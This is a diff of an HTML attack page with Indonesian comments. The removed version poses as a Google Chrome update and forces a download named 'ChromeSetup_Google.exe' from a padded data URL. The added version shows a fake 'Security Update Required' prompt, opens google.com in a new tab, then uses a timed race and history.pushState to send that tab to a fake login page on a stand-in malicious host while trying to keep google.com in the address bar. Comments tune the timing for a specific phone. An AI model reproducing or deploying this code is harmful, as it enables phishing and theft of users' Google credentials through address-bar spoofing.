@@ -1,32 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Google Security Update</title>
+    <title>Update System</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #1a73e8; color: white; border: none; border-radius: 5px; }
+    </style>
 </head>
-<body style="font-family: Arial; text-align: center; padding-top: 50px;">
-    <h2>Google Desktop Service</h2>
-    <button id="trigger" style="padding: 15px 30px; cursor: pointer;">Update Chrome Now</button>
+<body>
+    <h2>Security Update Required</h2>
+    <p>Your Chrome version is outdated. Please verify your account to continue.</p>
+    <br>
+    <button onclick="startSpoof()">Verify via Google</button>
 
     <script>
-        document.getElementById('trigger').onclick = function() {
-            // Payload Abhishek Kumar versi PC
-            const padding = "B".repeat(250); 
-            const payload = "data://google.com/application/octet-stream;" + padding + ",base64,ZXN0dGVzdGVzdHRlc3Q=";
-            
-            // Trik: Buka Google asli dulu
-            const newWindow = window.open("https://www.google.com", "_blank");
+        function startSpoof() {
+            // 1. Buka tab baru ke domain target (yang mau di-spoof)
+            const victimTab = window.open("https://www.google.com", "_blank");
 
-            // Tembak download setelah tab baru fokus
+            // 2. Race condition: Tunggu sebentar pas browser lagi proses loading
             setTimeout(() => {
-                const a = document.createElement('a');
-                a.href = payload;
-                a.download = "ChromeSetup_Google.exe"; // Pake .exe biar valuenya tinggi
-                document.body.appendChild(a);
-                a.click();
-                
-                console.log("Payload sent to PC Chrome.");
-            }, 800);
-        };
+                if (victimTab) {
+                    // 3. Tembak navigasi ke "Halaman Palsu" kita berkali-kali
+                    // Tujuannya biar Address Bar nyangkut di google.com tapi kontennya lari ke kita
+                    victimTab.location = "https://your-malicious-site.com/fake-login.html";
+                    
+                    // 4. Teknik tambahan: PushState buat nahan URL di bar
+                    victimTab.history.pushState({}, "", "https://www.google.com/search?q=security-update");
+                }
+            }, 800); // Mainin angka ini (600ms - 1200ms) buat Tecno Pova 7 lo
+        }
     </script>
 </body>
 </html>
